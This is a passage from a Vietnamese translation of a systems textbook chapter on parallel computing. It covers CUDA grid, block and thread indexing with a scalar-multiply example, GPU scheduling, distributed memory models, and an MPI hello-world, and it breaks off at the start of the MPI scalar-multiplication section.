<p>Mỗi thread được định danh duy nhất bởi vị trí (<em>x</em>, <em>y</em>, <em>z</em>) của nó trong block chứa nó, và vị trí (<em>x</em>, <em>y</em>, <em>z</em>) của block đó trong grid.</p>
<p>Ví dụ: lập trình viên có thể định nghĩa kích thước block và grid hai chiều như sau:</p>
<pre><code class="language-c">dim3 blockDim(16,16);  // 256 thread mỗi block, sắp xếp 2D 16x16
dim3 gridDim(20,20);   // 400 block mỗi grid, sắp xếp 2D 20x20
</code></pre>
<p>Khi gọi một kernel, cấu hình block/grid và thread/block được chỉ định trong lời gọi.<br />
Ví dụ: đây là lời gọi tới một kernel function tên <code>do_something</code>, chỉ định cấu hình grid và block sử dụng <code>gridDim</code> và <code>blockDim</code> ở trên (và truyền tham số <code>dev_array</code> và 100):</p>
<pre><code class="language-c">ret = do_something&lt;&lt;&lt;gridDim,blockDim&gt;&gt;&gt;(dev_array, 100);
</code></pre>
<p><strong>Hình 2</strong> minh họa ví dụ về cách sắp xếp hai chiều của các block thread.<br />
Trong ví dụ này, grid là một mảng 3 × 2 block, và mỗi block là một mảng 4 × 3 thread.</p>
<p><img src="C15-Parallel/_images/gridblockthr.png" alt="An grid of 2D blocks, each block contains a 2D set of threads." /></p>
<p><strong>Hình 2.</strong> Mô hình thread trong CUDA. Một <strong>grid</strong> gồm các <strong>block</strong> chứa các thread. Các block và thread có thể được tổ chức theo bố cục một chiều, hai chiều hoặc ba chiều. Ví dụ này minh họa một grid gồm các block hai chiều, với 3 × 2 block mỗi grid, và mỗi block chứa một tập hợp thread hai chiều, 4 × 3 thread mỗi block.</p>
<p>Vị trí của một thread trong bố cục này được xác định bởi tọa độ (<em>x</em>, <em>y</em>) của nó trong block chứa nó (<code>threadIdx.x</code>, <code>threadIdx.y</code>) và tọa độ (<em>x</em>, <em>y</em>) của block đó trong grid (<code>blockIdx.x</code>, <code>blockIdx.y</code>).<br />
Lưu ý rằng tọa độ của block và thread đều dựa trên (<em>x</em>, <em>y</em>), với trục x nằm ngang và trục y nằm dọc. Phần tử (0,0) nằm ở góc trên bên trái.</p>
<p>CUDA kernel cũng có các biến xác định kích thước của block (<code>blockDim.x</code> và <code>blockDim.y</code>).<br />
Do đó, với bất kỳ thread nào đang thực thi kernel, vị trí (row, col) của nó trong mảng hai chiều các thread, bên trong mảng hai chiều các block, có thể được xác định logic như sau:</p>
<pre><code class="language-c">int row = blockIdx.y * blockDim.y + threadIdx.y;
int col = blockIdx.x * blockDim.x + threadIdx.x;
</code></pre>
<p>Mặc dù không bắt buộc, các lập trình viên CUDA thường tổ chức block và thread sao cho phù hợp với cách tổ chức logic của dữ liệu chương trình.<br />
Ví dụ: nếu một chương trình thao tác trên ma trận hai chiều, việc tổ chức thread và block thành cấu trúc hai chiều sẽ hợp lý hơn.<br />
Cách này cho phép sử dụng tọa độ (<em>x</em>, <em>y</em>) của block và thread bên trong block để ánh xạ vị trí của thread trong các block hai chiều tới một hoặc nhiều giá trị dữ liệu trong mảng hai chiều.</p>
<h4 id="ví-dụ-chương-trình-cuda-nhân-vô-hướng-scalar-multiply"><a class="header" href="#ví-dụ-chương-trình-cuda-nhân-vô-hướng-scalar-multiply">Ví dụ chương trình CUDA: Nhân vô hướng (Scalar Multiply)</a></h4>
<p>Ví dụ, hãy xét một chương trình CUDA thực hiện phép nhân vô hướng trên một vector:</p>
<pre><code class="language-c">x = a * x    // trong đó x là vector và a là giá trị vô hướng
</code></pre>
<p>Vì dữ liệu chương trình là các mảng một chiều, nên việc sử dụng bố cục một chiều cho blocks/grid và threads/block sẽ phù hợp.<br />
Điều này không bắt buộc, nhưng giúp việc ánh xạ thread tới dữ liệu dễ dàng hơn.</p>
<p>Khi chạy, hàm <code>main</code> của chương trình sẽ thực hiện các bước sau:</p>
<ol>
<li>Cấp phát bộ nhớ phía host cho vector <code>x</code> và khởi tạo nó.</li>
<li>Cấp phát bộ nhớ phía device cho vector <code>x</code> và sao chép dữ liệu từ bộ nhớ host sang bộ nhớ GPU.</li>
<li>Gọi hàm CUDA kernel để thực hiện phép nhân vô hướng trên vector song song, truyền vào địa chỉ vector <code>x</code> trên device và giá trị vô hướng <code>a</code>.</li>
<li>Sao chép kết quả từ bộ nhớ GPU về vector <code>x</code> trong bộ nhớ host.</li>
</ol>
<p>Trong ví dụ dưới đây, chúng tôi trình bày một chương trình CUDA thực hiện các bước trên để triển khai phép nhân vô hướng trên vector.<br />
Một số phần xử lý lỗi và chi tiết đã được lược bỏ, nhưng bạn có thể xem mã nguồn đầy đủ tại: <a href="C15-Parallel/_attachments/scalar_multiply_cuda.cu">scalar_multiply_cuda.cu</a>.</p>
<p>Hàm <code>main</code> của chương trình CUDA^3^ thực hiện bốn bước đã liệt kê ở trên:</p>
<pre><code class="language-c">#include &lt;cuda.h&gt;

#define BLOCK_SIZE       64     /* threads per block */
#define N              10240    /* vector size */

// some host-side init function
void init_array(int *vector, int size, int step);

// host-side function: main
int main(int argc, char **argv) {

  int *vector, *dev_vector, scalar;

  scalar = 3;     // init scalar to some default value
  if(argc == 2) { // get scalar's value from a command line argument
    scalar = atoi(argv[1]);
  }

  // 1. allocate host memory space for the vector (missing error handling)
  vector = (int *)malloc(sizeof(int)*N);

  // initialize vector in host memory
  // (a user-defined initialization function not listed here)
  init_array(vector, N, 7);

  // 2. allocate GPU device memory for vector (missing error handling)
  cudaMalloc(&amp;dev_vector, sizeof(int)*N);

  // 2. copy host vector to device memory (missing error handling)
  cudaMemcpy(dev_vector, vector, sizeof(int)*N, cudaMemcpyHostToDevice);

  // 3. call the CUDA scalar_multiply kernel
  // specify the 1D layout for blocks/grid (N/BLOCK_SIZE)
  //    and the 1D layout for threads/block (BLOCK_SIZE)
  scalar_multiply&lt;&lt;&lt;(N/BLOCK_SIZE), BLOCK_SIZE&gt;&gt;&gt;(dev_vector, scalar);

  // 4. copy device vector to host memory (missing error handling)
  cudaMemcpy(vector, dev_vector, sizeof(int)*N, cudaMemcpyDeviceToHost);

  // ...(do something on the host with the result copied into vector)

  // free allocated memory space on host and GPU
  cudaFree(dev_vector);
  free(vector);

  return 0;
}
</code></pre>
<p>Mỗi CUDA thread sẽ thực thi hàm CUDA kernel <code>scalar_multiply</code>.<br />
Một hàm kernel CUDA được viết từ góc nhìn của <strong>một thread riêng lẻ</strong>.<br />
Nó thường gồm hai bước chính:</p>
<ol>
<li>Thread gọi hàm xác định phần dữ liệu mà nó chịu trách nhiệm xử lý, dựa trên vị trí của thread trong block chứa nó và vị trí của block đó trong grid.</li>
<li>Thread gọi hàm thực hiện phép tính cụ thể của ứng dụng trên phần dữ liệu của mình.</li>
</ol>
<p>Trong ví dụ này, mỗi thread chịu trách nhiệm thực hiện phép nhân vô hướng trên <strong>chính xác một phần tử</strong> trong mảng.<br />
Mã hàm kernel trước tiên tính toán một giá trị chỉ số (index) duy nhất dựa trên block và thread identifier của thread gọi hàm.<br />
Sau đó, nó sử dụng giá trị này làm chỉ số để truy cập vào mảng dữ liệu và thực hiện phép nhân vô hướng trên phần tử đó:</p>
<pre><code class="language-c">array[index] = array[index] * scalar;
</code></pre>
<p>Các CUDA thread chạy trên các SM của GPU sẽ tính toán các giá trị index khác nhau để cập nhật các phần tử mảng song song.</p>
<pre><code class="language-c">/*
 * CUDA kernel function that performs scalar multiply
 * of a vector on the GPU device
 *
 * This assumes that there are enough threads to associate
 * each array[i] element with a signal thread
 * (in general, each thread would be responsible for a set of data elements)
 */
__global__ void scalar_multiply(int *array, int scalar) {

  int index;

  // compute the calling thread's index value based on
  // its position in the enclosing block and grid
  index = blockIdx.x * blockDim.x + threadIdx.x;

  // the thread's uses its index value is to
  // perform scalar multiply on its array element
  array[index] = array[index] * scalar;
}
</code></pre>
<h4 id="cuda-thread-scheduling-and-synchronization-lập-lịch-và-đồng-bộ-hóa-thread-trong-cuda"><a class="header" href="#cuda-thread-scheduling-and-synchronization-lập-lịch-và-đồng-bộ-hóa-thread-trong-cuda">CUDA Thread Scheduling and Synchronization (Lập lịch và đồng bộ hóa thread trong CUDA)</a></h4>
<p>Mỗi <strong>CUDA thread block</strong> được thực thi bởi một đơn vị <strong>SM</strong> (Streaming Multiprocessor) của GPU.<br />
Một SM sẽ lập lịch một <strong>warp</strong> gồm các thread từ cùng một thread block để chạy trên các lõi xử lý của nó.<br />
Tất cả các thread trong một warp sẽ thực thi cùng một tập lệnh theo kiểu <strong>lockstep</strong> (đồng bộ từng bước), thường là trên các dữ liệu khác nhau.<br />
Các thread chia sẻ <strong>instruction pipeline</strong> (đường ống lệnh) nhưng mỗi thread có <strong>register</strong> và <strong>stack space</strong> riêng cho biến cục bộ và tham số.</p>
<p>Vì các block của thread được lập lịch trên các SM riêng biệt, việc tăng số lượng thread mỗi block sẽ làm tăng mức độ thực thi song song.<br />
Do SM lập lịch các warp thread để chạy trên các đơn vị xử lý của nó, nếu số lượng thread mỗi block là bội số của kích thước warp, sẽ không có lõi xử lý nào của SM bị lãng phí trong quá trình tính toán.<br />
Trên thực tế, việc sử dụng số lượng thread mỗi block là một bội số nhỏ của số lõi xử lý trong một SM thường cho hiệu quả tốt.</p>
<p>CUDA đảm bảo rằng tất cả các thread từ một lần gọi <strong>kernel</strong> sẽ hoàn thành trước khi bất kỳ thread nào từ lần gọi kernel tiếp theo được lập lịch.<br />
Do đó, tồn tại một <strong>điểm đồng bộ ngầm</strong> giữa các lần gọi kernel riêng biệt.<br />
Tuy nhiên, trong một lần gọi kernel duy nhất, các thread block có thể được lập lịch chạy code kernel theo bất kỳ thứ tự nào trên các SM của GPU.<br />
Vì vậy, lập trình viên <strong>không nên</strong> giả định bất kỳ thứ tự thực thi nào giữa các thread thuộc các thread block khác nhau.<br />
CUDA cung cấp một số hỗ trợ đồng bộ hóa thread, nhưng <strong>chỉ</strong> cho các thread nằm trong cùng một thread block.</p>
<h3 id="1515-other-languages-for-gpgpu-programming-các-ngôn-ngữ-khác-cho-lập-trình-gpgpu"><a class="header" href="#1515-other-languages-for-gpgpu-programming-các-ngôn-ngữ-khác-cho-lập-trình-gpgpu">15.1.5. Other Languages for GPGPU Programming (Các ngôn ngữ khác cho lập trình GPGPU)</a></h3>
<p>Ngoài CUDA, còn có các ngôn ngữ lập trình khác cho GPGPU computing.<br />
<strong>OpenCL</strong>, <strong>OpenACC</strong> và <strong>OpenHMPP</strong> là ba ví dụ về các ngôn ngữ có thể được dùng để lập trình cho bất kỳ thiết bị đồ họa nào (không chỉ dành riêng cho thiết bị NVIDIA).</p>
<ul>
<li>
<p><strong>OpenCL</strong> (Open Computing Language) có mô hình lập trình tương tự CUDA; cả hai đều triển khai mô hình lập trình cấp thấp (hoặc lớp trừu tượng mỏng hơn) trên kiến trúc phần cứng đích.<br />
OpenCL hướng tới nhiều nền tảng tính toán không đồng nhất, bao gồm CPU của host kết hợp với các đơn vị tính toán khác, có thể là CPU hoặc accelerator như GPU và FPGA.</p>
</li>
<li>
<p><strong>OpenACC</strong> (Open Accelerator) là mô hình lập trình trừu tượng cấp cao hơn so với CUDA hoặc OpenCL.<br />
Nó được thiết kế để dễ dàng di chuyển (portability) và thuận tiện cho lập trình viên.<br />
Lập trình viên chỉ cần chú thích (annotate) các phần code cần thực thi song song, và trình biên dịch sẽ tạo ra code song song có thể chạy trên GPU.</p>
</li>
<li>
<p><strong>OpenHMPP</strong> (Open Hybrid Multicore Programming) là một ngôn ngữ khác cung cấp lớp trừu tượng lập trình cấp cao cho lập trình không đồng nhất.</p>
</li>
</ul>
<h3 id="1516-tài-liệu-tham-khảo-references"><a class="header" href="#1516-tài-liệu-tham-khảo-references">15.1.6. Tài liệu tham khảo (References)</a></h3>
<ol>
<li>
<p><em>A Survey Of Techniques for Architecting and Managing Asymmetric Multicore Processors</em>, Sparsh Mittal, trong <strong>ACM Computing Surveys</strong> 48(3), tháng 2 năm 2016.</p>
</li>
<li>
<p><em>FPGAs and the Road to Reprogrammable HPC</em>, inside HPC, tháng 7 năm 2019<br />
<a href="https://insidehpc.com/2019/07/fpgas-and-the-road-to-reprogrammable-hpc/">https://insidehpc.com/2019/07/fpgas-and-the-road-to-reprogrammable-hpc/</a></p>
</li>
<li>
<p><strong>CUDA Toolkit documentation</strong>:<br />
<a href="https://docs.nvidia.com/cuda/index.html">https://docs.nvidia.com/cuda/index.html</a></p>
</li>
<li>
<p><em>GPU Programming</em>, từ <strong>CSinParallel</strong>:<br />
<a href="https://csinparallel.org/csinparallel/modules/gpu_programming.html">https://csinparallel.org/csinparallel/modules/gpu_programming.html</a><br />
và các module lập trình GPU khác tại:<br />
<a href="https://csinparallel.org">https://csinparallel.org</a></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="152-hệ-thống-bộ-nhớ-phân-tán-truyền-thông-điệp-và-mpi-distributed-memory-systems-message-passing-and-mpi"><a class="header" href="#152-hệ-thống-bộ-nhớ-phân-tán-truyền-thông-điệp-và-mpi-distributed-memory-systems-message-passing-and-mpi">15.2. Hệ thống bộ nhớ phân tán, truyền thông điệp và MPI (Distributed Memory Systems, Message Passing, and MPI)</a></h2>
<p>Chương 14 đã mô tả các cơ chế như<br />
<a href="C15-Parallel/../C14-SharedMemory/posix.html#_hello_threading_writing_your_first_multithreaded_program">Pthreads</a> và<br />
<a href="C15-Parallel/../C14-SharedMemory/openmp.html#_implicit_threading_with_openmp">OpenMP</a><br />
mà các chương trình sử dụng để tận dụng nhiều lõi CPU trên một <strong>shared memory system</strong> (hệ thống bộ nhớ chia sẻ).<br />
Trong các hệ thống như vậy, mỗi core chia sẻ cùng một phần cứng bộ nhớ vật lý, cho phép chúng trao đổi dữ liệu và đồng bộ hóa hoạt động bằng cách đọc và ghi vào các địa chỉ bộ nhớ chung.<br />
Mặc dù shared memory system giúp việc giao tiếp trở nên tương đối dễ dàng, nhưng khả năng mở rộng của chúng bị giới hạn bởi số lượng core CPU trong hệ thống.</p>
<p>Tính đến năm 2019, CPU máy chủ thương mại cao cấp thường cung cấp tối đa <strong>64 core</strong>.<br />
Tuy nhiên, với một số tác vụ, ngay cả vài trăm core CPU cũng <strong>chưa đủ</strong>.<br />
Ví dụ: hãy tưởng tượng việc mô phỏng động lực học chất lỏng của đại dương Trái Đất hoặc lập chỉ mục toàn bộ nội dung của World Wide Web để xây dựng một ứng dụng tìm kiếm.<br />
Những tác vụ khổng lồ như vậy đòi hỏi nhiều bộ nhớ vật lý và bộ xử lý hơn bất kỳ máy tính đơn lẻ nào có thể cung cấp.<br />
Do đó, các ứng dụng cần số lượng core CPU lớn sẽ chạy trên các hệ thống <strong>không</strong> sử dụng bộ nhớ chia sẻ.<br />
Thay vào đó, chúng được thực thi trên các hệ thống được xây dựng từ nhiều máy tính, mỗi máy có CPU và bộ nhớ riêng, và giao tiếp qua mạng để phối hợp hoạt động.</p>
<p>Một tập hợp các máy tính làm việc cùng nhau được gọi là <strong>distributed memory system</strong> (hệ thống bộ nhớ phân tán), hoặc thường gọi ngắn gọn là <strong>distributed system</strong> (hệ thống phân tán).</p>
<blockquote>
<p><strong>Ghi chú về trình tự lịch sử</strong><br />
Mặc dù trong sách này chúng được trình bày sau, nhưng các nhà thiết kế hệ thống đã xây dựng <strong>distributed system</strong> từ lâu trước khi các cơ chế như thread hay OpenMP ra đời.</p>
</blockquote>
<p>Một số hệ thống bộ nhớ phân tán tích hợp phần cứng chặt chẽ hơn các hệ thống khác.<br />
Ví dụ: <strong>supercomputer</strong> (siêu máy tính) là một hệ thống hiệu năng cao, trong đó nhiều <strong>compute node</strong> (nút tính toán) được kết nối chặt chẽ với nhau thông qua một mạng liên kết tốc độ cao.<br />
Mỗi compute node có CPU, GPU và bộ nhớ riêng, nhưng nhiều node có thể chia sẻ các tài nguyên phụ trợ như bộ nhớ lưu trữ thứ cấp hoặc nguồn điện.<br />
Mức độ chia sẻ phần cứng cụ thể sẽ khác nhau giữa các siêu máy tính.</p>
<p>Ở phía đối lập, một ứng dụng phân tán có thể chạy trên một tập hợp <strong>lỏng lẻo</strong> (ít tích hợp) gồm các máy tính hoàn toàn độc lập (<strong>node</strong>), được kết nối bằng công nghệ mạng LAN truyền thống như Ethernet.<br />
Một tập hợp node như vậy được gọi là <strong>commodity off-the-shelf</strong> (COTS) cluster.<br />
COTS cluster thường sử dụng <strong>shared-nothing architecture</strong> (kiến trúc không chia sẻ), trong đó mỗi node có bộ phần cứng tính toán riêng (CPU, GPU, bộ nhớ và lưu trữ).</p>
<p>Hình 1 minh họa một hệ thống phân tán kiểu shared-nothing gồm hai máy tính dùng bộ nhớ chia sẻ.</p>
<p><img src="C15-Parallel/_images/SharedNothing.png" alt="Two computer block diagrams, each with a four-core CPU connected to a private memory and I/O controller. The I/O controller connects to a network interface, which connects the two nodes via unspecified network infrastructure (e.g., Ethernet, InfiniBand, Fibre Channel)." /></p>
<p><strong>Hình 1.</strong> Các thành phần chính của kiến trúc bộ nhớ phân tán kiểu shared-nothing được xây dựng từ hai compute node</p>
<h3 id="1521-các-mô-hình-xử-lý-song-song-và-phân-tán-parallel-and-distributed-processing-models"><a class="header" href="#1521-các-mô-hình-xử-lý-song-song-và-phân-tán-parallel-and-distributed-processing-models">15.2.1. Các mô hình xử lý song song và phân tán (Parallel and Distributed Processing Models)</a></h3>
<p>Các nhà thiết kế ứng dụng thường tổ chức ứng dụng phân tán theo những mô hình đã được kiểm chứng.<br />
Việc áp dụng các mô hình ứng dụng này giúp lập trình viên dễ dàng suy luận về ứng dụng, vì hành vi của nó sẽ tuân theo các chuẩn mực đã được hiểu rõ.<br />
Mỗi mô hình đều có ưu điểm và nhược điểm riêng — <strong>không có giải pháp “một cho tất cả”</strong>.<br />
Dưới đây là mô tả ngắn gọn một số mô hình phổ biến, lưu ý rằng đây <strong>không</strong> phải là danh sách đầy đủ.</p>
<h4 id="clientserver"><a class="header" href="#clientserver">Client/Server</a></h4>
<p><strong>Client/server model</strong> (mô hình khách/chủ) là một mô hình ứng dụng cực kỳ phổ biến, chia trách nhiệm của ứng dụng thành hai thành phần: <strong>client process</strong> (tiến trình khách) và <strong>server process</strong> (tiến trình chủ).<br />
Một server process cung cấp dịch vụ cho các client yêu cầu thực hiện một tác vụ nào đó.<br />
Server process thường <strong>lắng nghe</strong> tại các địa chỉ đã biết để nhận kết nối đến từ client.<br />
Khi kết nối được thiết lập, client gửi yêu cầu đến server process, và server sẽ hoặc là đáp ứng yêu cầu đó (ví dụ: lấy về một tệp được yêu cầu) hoặc báo lỗi (ví dụ: tệp không tồn tại hoặc client không được xác thực hợp lệ).</p>
<p>Có thể bạn chưa để ý, nhưng bạn đang truy cập cuốn sách này thông qua mô hình client/server!<br />
Trình duyệt web của bạn (client) đã kết nối đến một website (server) tại địa chỉ công khai <code>diveintosystems.org</code> để lấy nội dung của sách.</p>
<h4 id="pipeline"><a class="header" href="#pipeline">Pipeline</a></h4>
<p><strong>Pipeline model</strong> (mô hình đường ống) chia ứng dụng thành một chuỗi các bước riêng biệt, mỗi bước có thể xử lý dữ liệu một cách độc lập.<br />
Mô hình này hoạt động tốt với các ứng dụng có quy trình làm việc tuyến tính, lặp đi lặp lại trên lượng dữ liệu đầu vào lớn.</p>
<p>Ví dụ: trong sản xuất phim hoạt hình máy tính, mỗi khung hình (frame) phải được xử lý qua một chuỗi các bước biến đổi (ví dụ: thêm texture hoặc áp dụng ánh sáng).<br />
Vì mỗi bước diễn ra độc lập theo trình tự, các họa sĩ có thể tăng tốc quá trình render bằng cách xử lý song song nhiều khung hình trên một cụm máy tính lớn.</p>
<h4 id="bossworker"><a class="header" href="#bossworker">Boss/Worker</a></h4>
<p>Trong <strong>boss/worker model</strong> (mô hình sếp/thợ), một process đóng vai trò điều phối trung tâm và phân chia công việc cho các process ở các node khác.<br />
Mô hình này phù hợp với các bài toán cần xử lý một đầu vào lớn và có thể chia nhỏ.</p>
<p>Boss sẽ chia đầu vào thành các phần nhỏ hơn và giao một hoặc nhiều phần cho mỗi worker.<br />
Trong một số ứng dụng, boss có thể gán tĩnh cho mỗi worker đúng một phần dữ liệu.<br />
Trong các trường hợp khác, worker có thể liên tục hoàn thành một phần dữ liệu rồi quay lại boss để nhận phần tiếp theo một cách động.</p>
<p>Ở phần sau của mục này, chúng ta sẽ xem một ví dụ chương trình trong đó boss chia một mảng cho nhiều worker để thực hiện phép nhân vô hướng (scalar multiplication) trên mảng.</p>
<p>Lưu ý: mô hình này đôi khi còn được gọi bằng các tên khác như <strong>master/worker</strong> hoặc các biến thể khác, nhưng ý tưởng chính vẫn giống nhau.</p>
<h4 id="peer-to-peer"><a class="header" href="#peer-to-peer">Peer-to-Peer</a></h4>
<p>Khác với boss/worker model, ứng dụng <strong>peer-to-peer</strong> (ngang hàng) không dựa vào một process điều khiển tập trung.<br />
Thay vào đó, các peer process tự tổ chức ứng dụng thành một cấu trúc trong đó mỗi peer đảm nhận gần như cùng một mức trách nhiệm.</p>
<p>Ví dụ: trong giao thức chia sẻ tệp <strong>BitTorrent</strong>, mỗi peer liên tục trao đổi các phần của tệp với các peer khác cho đến khi tất cả đều nhận được toàn bộ tệp.</p>
<p>Do không có thành phần tập trung, ứng dụng peer-to-peer thường <strong>chịu lỗi tốt</strong> (robust) khi một node gặp sự cố.<br />
Tuy nhiên, chúng thường đòi hỏi các thuật toán phối hợp phức tạp, khiến việc xây dựng và kiểm thử trở nên khó khăn.</p>
<h3 id="1522-communication-protocols-giao-thức-truyền-thông"><a class="header" href="#1522-communication-protocols-giao-thức-truyền-thông">15.2.2. Communication Protocols (Giao thức truyền thông)</a></h3>
<p>Dù là một phần của <strong>supercomputer</strong> hay <strong>COTS cluster</strong>, các process trong hệ thống bộ nhớ phân tán giao tiếp với nhau thông qua <strong>message passing</strong> (truyền thông điệp), trong đó một process gửi tường minh một thông điệp đến một hoặc nhiều process ở node khác, và các process đó sẽ nhận thông điệp.</p>
<p>Việc sử dụng mạng như thế nào là tùy thuộc vào ứng dụng chạy trên hệ thống:</p>
<ul>
<li>Một số ứng dụng cần giao tiếp thường xuyên để phối hợp chặt chẽ hành vi của các process trên nhiều node.</li>
<li>Một số ứng dụng khác chỉ giao tiếp để phân chia dữ liệu đầu vào lớn cho các process, sau đó chủ yếu làm việc độc lập.</li>
</ul>
<p>Một ứng dụng phân tán sẽ <strong>chuẩn hóa</strong> kỳ vọng giao tiếp của mình bằng cách định nghĩa một <strong>protocol</strong> (giao thức), mô tả tập hợp các quy tắc điều khiển việc sử dụng mạng, bao gồm:</p>
<ul>
<li>Khi nào một process nên gửi thông điệp</li>
<li>Gửi thông điệp cho process nào</li>
<li>Cách định dạng thông điệp</li>
</ul>
<p>Nếu không có protocol, ứng dụng có thể không diễn giải đúng thông điệp hoặc thậm chí rơi vào tình trạng <a href="C15-Parallel/../C14-SharedMemory/mutex.html#_deadlock">deadlock</a>.<br />
Ví dụ: nếu một ứng dụng gồm hai process, và mỗi process đều chờ process kia gửi thông điệp trước, thì cả hai sẽ không bao giờ tiến triển.<br />
Protocol giúp cấu trúc hóa việc giao tiếp, giảm khả năng xảy ra các lỗi như vậy.</p>
<p>Để triển khai một giao thức truyền thông, ứng dụng cần các chức năng cơ bản như:</p>
<ul>
<li>Gửi và nhận thông điệp</li>
<li>Định danh process (addressing)</li>
<li>Đồng bộ hóa việc thực thi của các process</li>
</ul>
<p>Nhiều ứng dụng tìm đến <strong>Message Passing Interface (MPI)</strong> để có được các chức năng này.</p>
<h3 id="1523-message-passing-interface-mpi"><a class="header" href="#1523-message-passing-interface-mpi">15.2.3. Message Passing Interface (MPI)</a></h3>
<p><strong>Message Passing Interface</strong> (MPI) định nghĩa (nhưng không tự triển khai) một giao diện chuẩn mà các ứng dụng có thể sử dụng để giao tiếp trong <strong>distributed memory system</strong> (hệ thống bộ nhớ phân tán).<br />
Bằng cách áp dụng chuẩn giao tiếp MPI, các ứng dụng trở nên <strong>portable</strong> (di động), nghĩa là chúng có thể được biên dịch và thực thi trên nhiều hệ thống khác nhau.<br />
Nói cách khác, miễn là hệ thống có cài đặt một bản triển khai MPI, ứng dụng portable có thể chạy từ hệ thống này sang hệ thống khác và kỳ vọng hoạt động đúng, ngay cả khi các hệ thống đó có đặc điểm phần cứng khác nhau.</p>
<p>MPI cho phép lập trình viên chia một ứng dụng thành nhiều <strong>process</strong>.<br />
Nó gán cho mỗi process của ứng dụng một <strong>định danh duy nhất</strong> gọi là <strong>rank</strong>, có giá trị từ 0 đến <em>N</em>-1 đối với ứng dụng có <em>N</em> process.<br />
Một process có thể biết rank của mình bằng cách gọi hàm <code>MPI_Comm_rank</code>, và biết tổng số process đang chạy trong ứng dụng bằng cách gọi <code>MPI_Comm_size</code>.<br />
Để gửi một thông điệp, process gọi <code>MPI_Send</code> và chỉ định rank của process nhận.<br />
Tương tự, process gọi <code>MPI_Recv</code> để nhận thông điệp, và có thể chỉ định chờ thông điệp từ một node cụ thể hoặc nhận từ bất kỳ process nào (sử dụng hằng số <code>MPI_ANY_SOURCE</code> làm rank).</p>
<p>Ngoài các hàm gửi và nhận cơ bản, MPI còn định nghĩa nhiều hàm giúp một process dễ dàng gửi dữ liệu đến nhiều process khác.<br />
Ví dụ: <code>MPI_Bcast</code> cho phép một process gửi thông điệp đến <strong>tất cả</strong> các process khác trong ứng dụng chỉ với một lời gọi hàm.<br />
MPI cũng định nghĩa cặp hàm <code>MPI_Scatter</code> và <code>MPI_Gather</code>, cho phép một process chia một mảng và phân phối các phần cho các process khác (<strong>scatter</strong>), các process này sẽ xử lý dữ liệu, và sau đó thu thập lại toàn bộ dữ liệu để hợp nhất kết quả (<strong>gather</strong>).</p>
<p>Vì MPI <strong>chỉ</strong> <em>đặc tả</em> tập hợp các hàm và cách chúng hoạt động, mỗi nhà thiết kế hệ thống có thể triển khai MPI theo cách phù hợp với khả năng của hệ thống của họ.<br />
Ví dụ: một hệ thống có mạng liên kết hỗ trợ <strong>broadcasting</strong> (gửi một bản sao thông điệp đến nhiều người nhận cùng lúc) có thể triển khai hàm <code>MPI_Bcast</code> hiệu quả hơn so với hệ thống không có hỗ trợ này.</p>
<h3 id="1524-mpi-hello-world"><a class="header" href="#1524-mpi-hello-world">15.2.4. MPI Hello World</a></h3>
<p>Để giới thiệu về lập trình MPI, hãy xem chương trình “hello world” (<a href="C15-Parallel/_attachments/hello_world_mpi.c">hello_world_mpi.c</a>) dưới đây:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &quot;mpi.h&quot;

int main(int argc, char **argv) {
    int rank, process_count;
    char hostname[1024];

    /* Initialize MPI. */
    MPI_Init(&amp;argc, &amp;argv);

    /* Determine how many processes there are and which one this is. */
    MPI_Comm_size(MPI_COMM_WORLD, &amp;process_count);
    MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank);

    /* Determine the name of the machine this process is running on. */
    gethostname(hostname, 1024);

    /* Print a message, identifying the process and machine it comes from. */
    printf(&quot;Hello from %s process %d of %d\n&quot;, hostname, rank, process_count);

    /* Clean up. */
    MPI_Finalize();

    return 0;
}
</code></pre>
<p>Khi khởi chạy chương trình này, MPI sẽ đồng thời thực thi nhiều bản sao của nó dưới dạng các process độc lập trên một hoặc nhiều máy tính.<br />
Mỗi process sẽ gọi các hàm MPI để xác định tổng số process đang chạy (<code>MPI_Comm_size</code>) và biết mình là process nào trong số đó (rank của process, với <code>MPI_Comm_rank</code>).<br />
Sau khi có thông tin này, mỗi process sẽ in ra một thông điệp ngắn chứa rank và tên máy (<code>hostname</code>) mà nó đang chạy, rồi kết thúc.</p>
<blockquote>
<p><strong>Chạy code MPI</strong><br />
Để chạy các ví dụ MPI này, bạn cần cài đặt một bản triển khai MPI như <a href="https://www.open-mpi.org/">OpenMPI</a> hoặc <a href="https://www.mpich.org/">MPICH</a> trên hệ thống của mình.</p>
</blockquote>
<p>Để biên dịch ví dụ này, sử dụng chương trình biên dịch <code>mpicc</code>, đây là phiên bản của <code>gcc</code> có hỗ trợ MPI, để xây dựng chương trình và liên kết với các thư viện MPI:</p>
<pre><code class="language-bash">$ mpicc -o hello_world_mpi hello_world_mpi.c
</code></pre>
<p>Để thực thi chương trình, dùng tiện ích <code>mpirun</code> để khởi chạy nhiều process song song với MPI.<br />
Lệnh <code>mpirun</code> cần được chỉ định máy nào sẽ chạy process (<code>--hostfile</code>) và số lượng process chạy trên mỗi máy (<code>-np</code>).</p>
<p>Ví dụ: ta có tệp <code>hosts.txt</code> chỉ định cho <code>mpirun</code> tạo 8 process trên hai máy tính, một tên <code>lemon</code> và một tên <code>orange</code>:</p>
<pre><code class="language-bash">$ mpirun -np 8 --hostfile hosts.txt ./hello_world_mpi
Hello from lemon process 4 of 8
Hello from lemon process 5 of 8
Hello from orange process 2 of 8
Hello from lemon process 6 of 8
Hello from orange process 0 of 8
Hello from lemon process 7 of 8
Hello from orange process 3 of 8
Hello from orange process 1 of 8
</code></pre>
<blockquote>
<p><strong>Thứ tự thực thi trong MPI</strong><br />
Bạn <strong>không bao giờ</strong> nên giả định về thứ tự thực thi của các process MPI.<br />
Các process được khởi chạy trên nhiều máy, mỗi máy có hệ điều hành và bộ lập lịch process riêng.<br />
Nếu tính đúng đắn của chương trình yêu cầu các process chạy theo một thứ tự nhất định, bạn phải đảm bảo thứ tự đó xảy ra — ví dụ: buộc một số process tạm dừng cho đến khi nhận được thông điệp.</p>
</blockquote>
<h3 id="1525-nhân-vô-hướng-với-mpi-mpi-scalar-multiplication"><a class="header" href="#1525-nhân-vô-hướng-với-mpi-mpi-scalar-multiplication">15.2.5. Nhân vô hướng với MPI (MPI Scalar Multiplication)</a></h3>
<p>Để có một ví dụ MPI thực tế hơn, hãy xét bài toán <strong>nhân vô hướng</strong> (scalar multiplication) trên một mảng.<br />
